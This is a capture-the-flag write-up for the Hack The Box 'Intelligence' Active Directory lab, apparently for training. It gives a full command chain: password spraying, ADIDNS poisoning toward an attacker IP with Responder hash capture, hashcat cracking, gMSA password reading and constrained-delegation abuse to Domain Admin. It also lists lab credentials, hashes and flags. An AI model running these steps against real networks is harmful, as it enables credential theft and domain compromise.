# HTB Intelligence — Full Writeup

**Difficulty:** Medium | **OS:** Windows / Active Directory | **Domain:** `intelligence.htb` | **Hostname:** `DC`

---

## Synopsis

Intelligence is a Windows AD box built almost entirely around OSINT. A web app hosts internally-generated PDF "reports" whose filenames follow a predictable date-based scheme; brute-forcing that scheme and mining the PDFs for both **metadata** and **body text** yields a domain username list and a leaked default onboarding password. A single-password spray across that list lands a low-privileged foothold, which is enough to read a scheduled PowerShell script that blindly authenticates to any DNS record starting with `web*` — an **ADIDNS (Active Directory-Integrated DNS) abuse** primitive that lets an authenticated low-priv user register a malicious record and capture a second user's NTLMv2 hash via Responder. That second account belongs to a group with **ReadGMSAPassword** rights on a gMSA, which in turn holds **constrained delegation** rights to the DC — chained together for a Domain Admin shell.

---

## Recon

### Nmap

```
nmap -sCV -Pn -p- --min-rate 50000 10.129.95.154
```

Full DC stack: Kerberos (88), LDAP (389/3268/636/3269), SMB (445), RPC, `kpasswd` (464), plus **port 80 (IIS 10.0)** hosting a site titled "Intelligence" — unusual to see a live custom web app directly on a domain controller, and worth investigating before anything else.

Also flagged: **`clock-skew: ~7h`** between attacker box and target. Kerberos tooling has a tight (default 5-minute) tolerance for clock drift, so every Kerberos-aware command for the rest of the engagement needs a `faketime "7+ hours"` prefix (or `sudo ntpdate -u <target>` to sync outright).

### Web enumeration

`ffuf` against the site root found `/documents/` (directory listing forbidden — 403) and the static `index.html`. Viewing page source revealed direct links to dated PDF "reports":

```html
<a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">Download</a>
<a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">Download</a>
```

Filename pattern: `YYYY-MM-DD-upload.pdf`. Directory listing being blocked doesn't matter once the naming scheme is known — the files themselves are still directly fetchable.

---

## OSINT — Username & Password Harvest

Brute-forced the full 2020–2021 date range with a simple loop, keeping only HTTP 200 responses:

```bash
mkdir -p pdfs
start="2020-01-01"; end="2021-12-31"
d="$start"
while [[ "$d" < $(date -I -d "$end + 1 day") ]]; do
    url="http://intelligence.htb/documents/${d}-upload.pdf"
    code=$(curl -s -o "pdfs/${d}-upload.pdf" -w "%{http_code}" "$url")
    [[ "$code" == "200" ]] || rm -f "pdfs/${d}-upload.pdf"
    d=$(date -I -d "$d + 1 day")
done
```

~100 PDFs downloaded (hits are irregular, not strictly daily). Two separate angles turned up useful data:

**1. Metadata (`Creator` field) — usernames:**
```bash
exiftool pdfs/*.pdf | grep -i creator | awk -F': ' '{print $2}' | sort -u > users.txt
```
Yielded **30 unique usernames** in `firstname.lastname` format (e.g. `Stephanie.Young`, `Tiffany.Molina`).

AS-REP Roasting the full list came back clean — no accounts have Kerberos pre-authentication disabled:
```bash
faketime "7+ hours" GetNPUsers.py -usersfile users.txt -no-pass -dc-ip 10.129.95.154 intelligence.htb/
```

**2. Body text — a leaked default password:**
```bash
for f in pdfs/*.pdf; do pdftotext "$f" -; done > all_text.txt
grep -i -B2 -A5 "default password" all_text.txt
```
```
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
```

An onboarding PDF literally spells out the default password given to new hires.

---

## Foothold

One password, thirty candidate usernames — the low-risk spray direction (single attempt per account keeps well clear of any lockout threshold):

```bash
netexec smb 10.129.95.154 -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
```

**Hit:** `intelligence.htb\Tiffany.Molina : NewIntelligenceCorpUser9876`

---

## Lateral Movement — ADIDNS Abuse

Authenticated enumeration with Tiffany's creds:

```bash
netexec smb 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
netexec ldap 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --gmsa
```

Two findings:

- An `IT`-named SMB share, readable by Tiffany, containing `downdetector.ps1`.
- A gMSA, `svc_int$`, readable only by `DC$` and a group called **`itsupport`** (Tiffany isn't a member — no password read yet).

`downdetector.ps1` (comment: "Check web server status. Scheduled to run every 5min"):

```powershell
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Every 5 minutes, this task enumerates DNS records matching `web*` and sends an authenticated (`-UseDefaultCredentials`, i.e. NTLM/Kerberos) HTTP request to **whatever hostname is registered** — with no validation of what's actually listening there. Since AD-integrated DNS zones grant `Authenticated Users` `CreateChild` rights by default, any valid domain credential (even Tiffany's low-priv one) can register a new record matching the `web*` pattern and have this scheduled task authenticate straight to an attacker-controlled listener.

An unauthenticated dynamic update was tested first and correctly refused (secure-only zone):
```bash
nsupdate
> server 10.129.95.154
> update add test.intelligence.htb 600 A <attacker-ip>
> send
update failed: REFUSED
```

An *authenticated* update via native `nsupdate -g` (GSS-TSIG) was attempted next but repeatedly stalled — reverse-DNS-based SPN resolution and local `krb5.conf`/GSSAPI plumbing issues made it unreliable. Switched to **`dnstool.py`** from the `krbrelayx` toolkit instead, which handles Kerberos auth internally from a plain username/password:

```bash
git clone https://github.com/dirkjanm/krbrelayx
python3 krbrelayx/dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.129.95.154 -a add -r web1 -d <attacker-ip> -t A
```

Confirmed the record resolved, then captured the scheduled task's authentication attempt:

```bash
sudo responder -I tun0
```

```
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:...
```

Cracked instantly against rockyou:

```bash
hashcat -m 5600 ted.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `Ted.Graves : Mr.Teddy`

---

## Privilege Escalation — ReadGMSAPassword → Constrained Delegation

`Ted.Graves` is a member of the `itsupport` group, which is authorized to read `svc_int$`'s gMSA password:

```bash
netexec ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
```
```
Account: svc_int$   NTLM: 51854c912c4caa549034deb480ca8e75   PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```

`svc_int$` holds classic (non-resource-based) constrained delegation rights, confirmed via its `msDS-AllowedToDelegateTo` attribute:

```bash
ldapsearch -x -H ldap://10.129.95.154 -D 'Ted.Graves@intelligence.htb' -w 'Mr.Teddy' \
  -b "dc=intelligence,dc=htb" "(samaccountname=svc_int$)" msDS-AllowedToDelegateTo
```
```
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
```

This is the *front-end-configured* form of constrained delegation (not RBCD) — the trust was already granted on `svc_int$` itself by an administrator; no `msDS-AllowedToActOnBehalfOfOtherIdentity` write was needed. `svc_int$`'s NTLM hash is enough to chain S4U2Self (impersonate Administrator to itself) + S4U2Proxy (trade that for a service ticket to the allowed SPN):

```bash
faketime "7+ hours" getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator \
  intelligence.htb/svc_int -hashes :51854c912c4caa549034deb480ca8e75 -dc-ip 10.129.95.154

export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
faketime "7+ hours" wmiexec.py -k -no-pass dc.intelligence.htb
```

```
C:\>whoami /all
intelligence\administrator
...
intelligence\Domain Admins
intelligence\Enterprise Admins
```

Domain Admin.

---

## Full Command List (chronological)

```bash
nmap -sCV -Pn -p- --min-rate 50000 10.129.95.154
ffuf -c -u http://intelligence.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.js,.bak

# PDF harvesting
mkdir -p pdfs
# (date-range loop over documents/YYYY-MM-DD-upload.pdf, 2020-01-01 to 2021-12-31)
exiftool pdfs/*.pdf | grep -i creator | awk -F': ' '{print $2}' | sort -u > users.txt
faketime "7+ hours" GetNPUsers.py -usersfile users.txt -no-pass -dc-ip 10.129.95.154 intelligence.htb/
for f in pdfs/*.pdf; do pdftotext "$f" -; done > all_text.txt
grep -i -B2 -A5 "default password" all_text.txt

# Foothold
netexec smb 10.129.95.154 -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success

# Authenticated enumeration
netexec smb 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
netexec ldap 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --gmsa
smbclient //10.129.95.154/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
cat downdetector.ps1

# ADIDNS abuse + capture
git clone https://github.com/dirkjanm/krbrelayx
python3 krbrelayx/dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.129.95.154 -a add -r web1 -d 10.10.14.218 -t A
dig @10.129.95.154 web1.intelligence.htb
sudo responder -I tun0
hashcat -m 5600 ted.hash /usr/share/wordlists/rockyou.txt

# Privesc
netexec smb 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --groups
netexec ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
ldapsearch -x -H ldap://10.129.95.154 -D 'Ted.Graves@intelligence.htb' -w 'Mr.Teddy' -b "dc=intelligence,dc=htb" "(samaccountname=svc_int$)" msDS-AllowedToDelegateTo
faketime "7+ hours" getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51854c912c4caa549034deb480ca8e75 -dc-ip 10.129.95.154
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
faketime "7+ hours" wmiexec.py -k -no-pass dc.intelligence.htb
```

---

## Credentials Found

| Account | Password / Hash | Source |
|---|---|---|
| (default, multiple new hires) | `NewIntelligenceCorpUser9876` | Body text of an onboarding PDF (`pdftotext`) |
| `intelligence\Tiffany.Molina` | `NewIntelligenceCorpUser9876` | Default password reused, found via SMB spray |
| `intelligence\Ted.Graves` | NTLMv2 hash → cracked to `Mr.Teddy` | Responder capture of `downdetector.ps1`'s outbound auth to a poisoned `web1` DNS record |
| `svc_int$` (gMSA) | NTLM `51854c912c4caa549034deb480ca8e75` | `ReadGMSAPassword` via `itsupport` group membership (Ted.Graves) |

---

## Flags

| Flag | Value |
|---|---|
| `user.txt` | `a4ce8ba12922c1ac544da01efbbf5fc6` |
| `root.txt` | `0418d8f90da2f9f9037e18130a423030` |

---

## Key Takeaways

- **PDF metadata is only half the story.** `exiftool`'s `Creator` field gave a username list, but the actual body text (`pdftotext`) is what leaked the default password — always check both when a box hands you a document trove.
- **One password, many usernames** is the safe spray direction (low lockout risk); the reverse is what actually triggers account lockouts in the real world.
- **AD-integrated DNS zones default to letting any `Authenticated User` create new records** (`CreateChild` on the zone) once dynamic updates are set to secure-only — a fully unauthenticated `nsupdate` will correctly get `REFUSED`, but that's a prompt to authenticate, not a dead end.
- Native `nsupdate -g` (GSS-TSIG) is finicky outside a properly joined/configured environment (SPN resolution via reverse DNS, local `krb5.conf` conflicts with distro defaults). `dnstool.py` (krbrelayx) sidesteps all of that by handling Kerberos auth from a plain username/password.
- **Classic constrained delegation vs. RBCD** are easy to conflate since both use S4U2Self/S4U2Proxy under the hood — the difference is *where* the trust is configured (`msDS-AllowedToDelegateTo` on the front-end account vs. `msDS-AllowedToActOnBehalfOfOtherIdentity` on the back-end resource) and *who* can set it (domain admin vs. anyone with write access to the target object).
- A scheduled task that blindly authenticates to whatever a DNS name resolves to, with no validation, is a textbook **NTLM capture primitive** once you can control DNS — this pattern (ADIDNS abuse → Responder capture) shows up repeatedly across AD boxes wherever dynamic DNS updates are permissive.
